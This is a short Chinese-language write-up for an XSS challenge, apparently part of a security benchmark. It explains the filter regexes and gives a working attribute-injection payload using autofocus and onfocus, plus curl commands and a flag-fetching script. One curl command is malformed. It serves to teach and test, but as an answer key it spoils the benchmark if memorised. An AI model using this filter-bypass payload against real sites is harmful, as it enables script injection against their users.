# X-012-24 Exploit Notes

## 题目要点

- 路由与参数：GET `/page?name=...`（读取查询参数 `name`）。
- 注入位置：将 `name` 直接拼到输入框的 `value="..."` 属性中（没有转义）。
- 过滤规则（`src/app.py`）：
  - 删除带引号包裹的“XSS”：`re.sub(r"['"]XSS['"]", "", msg, re.I)`。
  - 破坏所有以字母或斜杠开头的标签：`re.sub(r"<[a-z/]", "", msg, re.I)`。
- 触发逻辑（`src/check.js`）：仅对含有 `[autofocus]` 或 `[onfocus]` 的元素派发 `focus` 事件，监听 `alert/confirm/prompt`，校验值是否为 `XSS`。

综上：不能新建标签（`<img>`, `<script>`, `<image>` 都会被破坏），必须“属性注入”。通过闭合 `value` 的双引号并追加 `autofocus/onfocus`。

## 推荐 Payload

放入 `name` 参数：

```
" autofocus onfocus=alert(/XSS/.source) a="
```

拼接后形成：

```
<input ... value="" autofocus onfocus=alert(/XSS/.source) a="">
```

其中 `/XSS/.source` 保证弹窗内容为 `XSS`（题目判定要求），避免被 `['"]XSS['"]` 这条规则删除。

## curl 用法

- 指定题目要求的固定 GET（含 IP 与端口）：

```
curl -X Get http://ip32776/page?name=%22%20autofocus%20onfocus%3Dalert%28%2FXSS%2F.source%29%3E
```

- URL 编码由 curl 处理（更通用写法）：

```
curl -G 'http://<host>:<port>/page' \
  --data-urlencode 'name=" autofocus onfocus=alert(/XSS/.source) a="'
```

- 或手写完整编码（示例）：

```
curl 'http://<host>:<port>/page?name=%22%20autofocus%20onfocus%3Dalert(%2FXSS%2F.source)%20a%3D%22'
```

## 脚本用法（exp.py）

```
python3 benchmarks/X-012-24/exp.py
```

- 脚本内已固定目标地址与 payload，会直接请求并输出 flag。
- 自动提取 `Here is the flag:` 或 `FLAG{...}`；若未匹配，打印完整响应便于排查。
